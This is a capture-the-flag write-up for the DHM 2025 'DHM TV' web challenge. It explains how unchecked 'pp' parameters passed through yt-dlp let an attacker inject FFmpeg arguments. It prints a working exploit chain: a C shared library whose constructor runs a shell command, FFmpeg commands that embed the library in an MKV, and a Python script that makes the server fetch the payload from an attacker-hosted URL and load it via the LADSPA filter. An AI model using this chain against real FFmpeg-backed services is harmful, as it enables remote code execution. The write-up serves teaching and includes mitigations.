---
ctf: DHM
title: DHM TV
authors:
    - name: d0ntrash
      url: https://blog.d0ntrash.de/
description: To become a proper hacker in the DÖSCH (Deutschland, Österreich, Schweiz) region, you can't miss out on this essential part of the culture. Sit back, relax, and enjoy! Note the duröh.re domain is out of scope for this challenge, we had to use it to avoid YouTube blocking us 😑 Random video IDs work, but you'll always get the same video.
categories:
    - Web
difficulty: Medium
ctf_year: 2025
event_url: https://hacking-meisterschaft.de/
challengefiles: dhm-tv
published: "2025-07-05"
---


# TL;DR

- **Challenge setup:** **Python Flask** server using **yt-dlp** with **FFmpeg** to serve a `DuRöhre` video.
- **Key discovery:** Repeated `pp` query parameters reach **FFmpeg** as unchecked options.
- **Exploitation:** Extract an attached shared library from an `MKV`, then load it through **FFmpeg's** `LADSPA` filter.
- **Result:** The library runs `/readflag` and writes the flag into the public static directory.

# Introduction

The challenge presents a retro television page that plays a fixed `DuRöhre` video called *Kuchenblech*.
The `DuRöhre` domain itself is out of scope.
We get the **Flask** application and its **Docker** setup, so the interesting part might be about how the server downloads and converts that video.

![DHM TV serving the DuRöhre video](ctf/writeups/dhm/dhmtv/landing_page.png "DHM TV landing page")

# Reconnaissance

The page's `tv.js` requests the video from `/play`.
In `app.py`, that route requires a `DuRöhre` watch URL with an eleven-character video ID and accepts a three- or four-character lowercase alphanumeric `f` value to specify the format.
It serves `./vids/<id>.<format>` if that file is cached.
Otherwise, it calls [**yt-dlp**](https://github.com/yt-dlp/yt-dlp/) to download and process the video.

The server passes a given list of `pp` query parameters straight into **yt-dlp** for post-processing:

```python
'postprocessors': [{
    'key': 'FFmpegVideoConvertor',
    'preferedformat': vid_format,
}],
'postprocessor_args': args,
```

Only root can read `/flag.txt`.
The **Docker** image provides a setuid-root `/readflag` helper, so our goal is to execute that helper in the container and capture its output.

The fixed video is already `MP4`, so the default `f=mp4` makes [**yt-dlp** skip **FFmpeg**](https://github.com/yt-dlp/yt-dlp/blob/b77e5a553a5d91bd059c3e3f1f3698be417132bf/yt_dlp/postprocessor/ffmpeg.py#L563-L573) and the injected `pp` values never reach it.
[**FFmpeg**](https://code.ffmpeg.org/FFmpeg/FFmpeg) is one of the most popular tools to record, convert, stream and manipulate audio and video files.
We could for example use `f=mp3` to force conversion and thus execution of **FFmpeg**.

# Vulnerability Description

The application never validates the `pp` values as **FFmpeg** options.
In [**yt-dlp** 2025.04.30](https://github.com/yt-dlp/yt-dlp/blob/b77e5a553a5d91bd059c3e3f1f3698be417132bf/yt_dlp/postprocessor/ffmpeg.py#L339-L365), `postprocessor_args` are inserted immediately before the converter's output filename and the resulting argument list is passed to **FFmpeg**.
This **FFmpeg** argument injection lets an attacker add another input with `-i` or an audio filter with `-af`.

For `f=mp3`, the application names the downloaded `MP4` `<id>.mp3`.
The highlighted `[pp values]` placeholder shows where the repeated `pp` parameters enter the command:

<pre class="highlight command-example"><code>ffmpeg -y -loglevel repeat+info -i file:./vids/&lt;id&gt;.mp3 -map 0 -dn -ignore_unknown -movflags +faststart <mark class="command-placeholder">[pp values]</mark> file:./vids/&lt;id&gt;.mp3.mp3</code></pre>

# Exploitation

To turn the injected arguments into code execution, we use **FFmpeg's** `LADSPA` audio filter.
During the competition a teammate found [GTFOBins PR #482](https://github.com/GTFOBins/GTFOBins.github.io/commit/4f594274ca5bbe56ec045c028712c787ae30d6a0).
With this trick we can leverage `-af ladspa=file=/tmp/exploit.so` to make **FFmpeg** load a shared library.
[LADSPA](https://github.com/FFmpeg/FFmpeg/blob/n6.1.2/doc/filters.texi#L5586-L5605) is an audio plugin interface.
The filter's `file` option names the library to load.
[**FFmpeg** 6.1.2](https://github.com/FFmpeg/FFmpeg/blob/n6.1.2/libavfilter/af_ladspa.c#L505-L546) calls `dlopen()` on that path before checking for a `ladspa_descriptor` function.
We can exploit this as a **C** constructor runs during `dlopen()`, so the library does not need to be a valid `LADSPA` plugin.

First, we need to get the library onto the server.
The application has no upload route, and its checked `url` parameter cannot point to our own server.
An injected `-i` gives **FFmpeg** a second, unchecked URL.
[Martin Wagner's Jellyfin slides](https://martinwagner.co/slides/exploiting_jellyfin.pdf) show how to use a **Matroska** (`MKV`) attachment for a file write:
**FFmpeg** can [attach a file to the video and extract it to a chosen path](https://github.com/FFmpeg/FFmpeg/blob/n6.1.2/doc/ffmpeg.texi#L840-L867).
The `-dump_attachment:t /tmp/exploit.so` option applies to the next `-i` input and writes its attachment to the writable `/tmp` directory.
`:t` then selects attachment streams.

We compile this library as a Linux shared object for the target's architecture with `gcc -shared -fPIC -o exploit.so exploit.c`:

```c
#include <stdlib.h>

__attribute__((constructor)) static void setup(void) {
    system("/readflag > /app/static/flag.txt");
    exit(0);
}
```

The constructor runs as the web application's user.
The setuid bit lets `/readflag` read `/flag.txt` as root.
The application user owns `/app/static`, so the shell can redirect the helper's output to `/app/static/flag.txt`, which **Flask** serves publicly.

Next, we need an `MKV` containing the library.
Any short MP3 works as its audio track.
These commands generate one and attach `exploit.so`:

```sh
ffmpeg -f lavfi -i 'sine=frequency=440:duration=1' -c:a libmp3lame test.mp3
ffmpeg -i test.mp3 -map 0:a -c:a copy -attach exploit.so -metadata:s:t mimetype=application/octet-stream payload.mkv
```

The target's **FFmpeg** process must be able to fetch `payload.mkv`.
For a local setup, we can serve it with `python3 -m http.server 3000` and use a host address reachable from the container.
During the competition I used **Tailscale Funnel** to give the remote container a public `HTTPS` URL.

Once `payload.mkv` is reachable, the first `/play` request extracts its attached library to `/tmp/exploit.so`.
The second loads that library through `LADSPA`.
The script uses a fresh eleven-character video ID to avoid a cached response and sends each **FFmpeg** argument as a separate `pp` parameter:

```python
#!/usr/bin/env python3
import secrets
import sys

import requests

if len(sys.argv) != 3:
    raise SystemExit("Usage: python3 exploit.py BASE_URL PAYLOAD_MKV_URL")

base, payload_url = sys.argv[1].rstrip("/"), sys.argv[2]
video_id = secrets.token_urlsafe(8)  # Eleven URL-safe characters.
video_url = f"https://duröh.re/watch?v={video_id}"


def play(*options):
    params = [("url", video_url), ("f", "mp3")]
    params += [("pp", option) for option in options]
    response = requests.get(f"{base}/play", params=params, timeout=65)
    print(f"/play: HTTP {response.status_code}")


play(
    f"file:./vids/{video_id}.mp3.mp3",
    "-dump_attachment:t", "/tmp/exploit.so",
    "-i", payload_url,
)
play("-af", "ladspa=file=/tmp/exploit.so")

response = requests.get(f"{base}/static/flag.txt", timeout=10)
response.raise_for_status()
print(response.text.strip())
```

The first `pp` value, `file:./vids/<id>.mp3.mp3`, is an output filename for the preceding `-movflags +faststart` option.
That lets the following `-dump_attachment:t` and `-i` work on our hosted `MKV` as a new input.

You can run this script with `python3 exploit.py BASE_URL PAYLOAD_MKV_URL`, using a payload URL reachable from the target container.

Both `/play` requests return `500 Download failed` in this setup, even though their side effects succeed.
After conversion, **yt-dlp** deletes the downloaded `<id>.mp3` and leaves `<id>.mp3.mp3`, but **Flask** looks for `<id>.mp3`.
That cache miss lets the second request use the same ID and write the flag.
The final request reads the flag through `/static/flag.txt`.

# Mitigation

The server should keep conversion arguments under its own control instead of passing client-supplied `pp` values into `postprocessor_args`.
**FFmpeg** should also run without write access to the web-served static directory.

# Flag

DHM{ffmpeg_considered_duenn_wie_Kuchenblech?!}
